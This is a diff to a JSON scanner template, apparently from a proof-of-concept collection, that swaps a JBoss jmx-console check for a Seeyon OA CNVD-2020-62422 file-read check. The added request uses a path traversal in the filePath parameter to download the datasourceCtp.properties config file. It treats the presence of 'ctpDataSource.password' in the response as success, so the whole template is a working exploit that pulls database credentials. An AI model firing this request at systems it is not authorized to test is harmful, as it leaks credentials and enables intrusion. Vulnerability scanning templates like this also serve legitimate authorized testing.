@@ -1,13 +1,13 @@
 {
-    "Name": "jboss-unauth",
-    "Description": "jboss-unauth, unauthorized access vulnerability",
-    "Product": "jboss",
+    "Name": "Seeyon OA CNVD-2020-62422 Readfile",
+    "Description": "Seeyon OA CNVD-2020-62422 Readfile",
+    "Product": "Seeyon OA",
     "author": "chumeng",
     "Request":[
         {
         "Method": "GET",
         "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
-        "Uri":"/jmx-console/",
+        "Uri":"/seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties",
         "Port":"",
         "Data":"",
         "Follow_redirects":"false",
@@ -18,11 +18,12 @@
                 {
                 "Operation": "contains", 
                 "Key":"",
-                "Value": "jboss.management.local"
-                }, {
+                "Value": "ctpDataSource.password"
+                },
+                {
                     "Operation": "contains", 
                     "Key":"",
-                    "Value": "jboss.web"
+                    "Value": "application/x-msdownload"
                     },
                  {
                 "Operation": "code", 
@@ -34,3 +35,4 @@
         "Next_decide":""
                 }
 ]}
+
